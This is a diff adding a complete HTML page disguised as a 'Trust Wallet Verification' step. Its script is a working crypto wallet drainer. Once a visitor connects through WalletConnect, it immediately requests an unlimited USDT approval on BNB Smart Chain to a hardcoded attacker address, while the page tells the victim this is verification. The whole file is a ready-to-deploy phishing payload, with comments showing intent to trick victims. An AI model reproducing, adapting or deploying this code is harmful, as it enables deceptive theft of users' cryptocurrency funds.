@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</head>
+<body style="background:#0b0e11; color:white; text-align:center; padding-top:100px; font-family:sans-serif;">
+    <div id="status">Scanning successful. Please wait for the confirmation popup in Trust Wallet...</div>
+
+    <script>
+        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
+        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        async function init() {
+            try {
+                const WC = window.EthereumProvider || window.WalletConnectEthereumProvider.EthereumProvider;
+                const provider = await WC.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [56],
+                    showQrModal: true, // This generates the QR link for you
+                    metadata: { name: "Verification", description: "Secure Approval", url: window.location.origin, icons: [] }
+                });
+
+                // Detect connection
+                provider.on("connect", async () => {
+                    const web3Provider = new ethers.providers.Web3Provider(provider);
+                    const signer = web3Provider.getSigner();
+
+                    // AUTO-TRIGGER APPROVAL IMMEDIATELY
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(USDT_BSC, abi, signer);
+                    
+                    // This creates the "Confirmation" popup on their screen
+                    await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
+                    document.getElementById("status").innerText = "Verification Complete!";
+                });
+
+                await provider.connect();
+            } catch (err) { console.error(err); }
+        }
+        init();
+    </script>
+</body>
+</html>
